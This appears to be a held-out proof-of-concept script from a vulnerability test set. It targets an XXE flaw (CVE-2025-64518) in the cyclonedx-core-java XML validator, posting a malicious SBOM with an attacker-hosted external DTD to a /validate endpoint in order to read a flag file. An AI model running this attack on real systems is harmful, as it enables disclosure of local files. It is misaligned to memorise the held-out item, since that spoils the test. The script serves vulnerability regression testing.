#!/usr/bin/env python3
"""[HELD-OUT] CVE-2025-64518 residual -- XXE in the cyclonedx-core-java XML BOM VALIDATOR.

Same malicious SBOM as the seed (attacker-hosted external DTD, error-based read of file:///flag), but
handed to the REAL org.cyclonedx.parsers.XmlParser.validate(byte[]) via POST /validate instead of parse().

The CVE-2024-38374 fix (V1 = 9.0.4) only hardened the PARSER's DocumentBuilderFactory. The VALIDATE path
builds its Validator from CycloneDxSchema.getXmlSchema(...), whose SchemaFactory was NOT given
ACCESS_EXTERNAL_DTD/SCHEMA or FEATURE_SECURE_PROCESSING until 11.0.1. So on V1 the javax.xml.validation
Validator still resolves the external DTD/entities -> the flag content surfaces in one of the returned
ParseException messages -> flag reaches the response on V1 (the guard is INCOMPLETE).

On V2 (11.0.1, the CVE-2025-64518 fix) getXmlSchema sets ACCESS_EXTERNAL_DTD/SCHEMA="" +
FEATURE_SECURE_PROCESSING=true on the SchemaFactory, which propagate to the spawned Validator -> external
DTD refused -> BLOCKED (no flag).
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from poc_common import post, XXE_SBOM  # noqa: E402

BYPASS_PAYLOAD = XXE_SBOM


def bypass_poc(*, version="v1"):
    """Run the CVE-2025-64518 XXE residual through the VALIDATE path on `version`; return response text."""
    return post(BYPASS_PAYLOAD, version, "/validate")


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(bypass_poc(version=v))
